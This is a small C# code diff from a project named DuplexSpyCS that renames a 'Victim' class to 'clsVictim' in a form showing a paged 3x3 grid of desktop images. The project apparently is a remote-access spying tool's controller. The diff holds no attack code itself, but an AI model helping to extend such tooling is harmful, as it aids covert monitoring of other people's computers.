@@ -13,7 +13,7 @@ namespace DuplexSpyCS
     public partial class frmMultiDesktop : Form
     {
         private int idx_page = 1;
-        public List<Victim> l_victim;
+        public List<clsVictim> l_victim;
 
         public frmMultiDesktop()
         {
@@ -64,7 +64,7 @@ namespace DuplexSpyCS
             int idx_start = (idx_page - 1) * 9;
             for (int i = 0; i < 9 && idx_start + i < l_victim.Count; i++)
             {
-                Victim v = l_victim[idx_start + i];
+                clsVictim v = l_victim[idx_start + i];
                 int row = i / 3;
                 int col = i % 3;
                 PictureBox pb = (PictureBox)tableLayoutPanel1.Controls[i];
